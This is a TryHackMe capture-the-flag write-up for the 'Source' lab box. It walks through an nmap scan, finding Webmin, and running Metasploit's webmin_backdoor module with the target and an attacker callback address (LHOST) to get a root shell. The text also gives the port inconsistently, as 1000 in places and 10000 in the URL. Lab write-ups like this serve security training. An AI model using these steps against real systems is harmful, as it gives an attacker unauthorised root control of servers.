---
title: TryHackMe - Source
layout: post
categories:
- TryHackMe
tag: easy, ctf, cve
image: "/assets/img/source.png"
image_alt: source
---

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let's start.

<br>

## 1. Embark   

Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

<br>

### 1.1 user.txt

Let's do a nmap scan.

```
$ nmap -sSV 10.10.11.143
```

![nmap](/assets/img/tryhackme/source/nmap.png)

Two ports are open. These are **`22/tcp SSH and 1000/tcp HTTP`**. 

I am visiting the Webmin page running on port 1000. I see a page like this:

![home](/assets/img/tryhackme/source/home.png)

I fix the URL as HTTP like this [https://10.10.11.143:10000/](https://10.10.11.143:10000/)

The Webmin login page appears on the page.

![login](/assets/img/tryhackme/source/login.png)

I tried several login attempts but it didn't work. I'm searching for any security vulnerabilities in the version of Webmin used.

![browse](/assets/img/tryhackme/source/browse.png)

I see that this version of Webmin is vulnerable.

I decide to do a search using Metasploit.

```
$ msfconsole
$ search webmin
```

![search](/assets/img/tryhackme/source/search.png)

I've tried most of the ones here. I can only run **`7 exploit/linux/http/webmin_backdoor`**. 

Let's do the settings first.

```
$ set RHOSTS 10.10.11.143
$ set LHOST 10.8.86.168
$ set SSL true
$ show options
```
![set](/assets/img/tryhackme/source/set.png)

After making the settings, it should look like this.

```
$ show options
```

![options](/assets/img/tryhackme/source/options.png)

Let's run it.

```
$ run
``` 

![run](/assets/img/tryhackme/source/run.png)

Yes, it worked. We are inside with root privilege.

Let's get the user flag.

![user-flag](/assets/img/tryhackme/source/user-flag.png)

<br>

### 1.2 root.txt

Let's get the root flag.

![root-flag](/assets/img/tryhackme/source/root-flag.png)

<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
